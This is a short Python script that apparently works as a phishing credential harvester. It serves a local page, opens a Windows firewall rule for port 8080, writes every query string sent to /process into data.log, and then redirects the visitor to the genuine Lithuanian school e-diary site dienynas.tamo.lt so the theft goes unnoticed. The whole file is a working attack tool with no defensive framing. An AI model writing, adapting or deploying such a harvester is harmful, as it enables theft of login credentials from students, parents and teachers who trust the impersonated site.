import http.server
import socketserver
import urllib.parse
import os
PORT = 8080
REDIRECT_URL = "https://dienynas.tamo.lt/"
LOG_FILE = "./data.log"
SELF_PATH = os.path.dirname(os.path.realpath(__file__))
PAGE_PATH = os.path.join(SELF_PATH, "server/index.html")
os.system("netsh advfirewall firewall add rule name=\"Allow 8080\" dir=in action=allow protocol=TCP localport=8080")

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = parsed_path.query
        print(parsed_path.path)
        if parsed_path.path == "/process":
            with open(LOG_FILE, "a") as log:
                log.write(query_params + "\n")
                print("Logged:", query_params)
            
            self.send_response(302)
            self.send_header("Location", REDIRECT_URL)
            self.end_headers()
        else:
            with open(PAGE_PATH, "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
            

with socketserver.TCPServer(("0.0.0.0", PORT), CustomHandler) as httpd:
    print(f"Serving at port {PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print("Server stopped")
    os.system("netsh advfirewall firewall delete rule name=\"Allow 8080\"")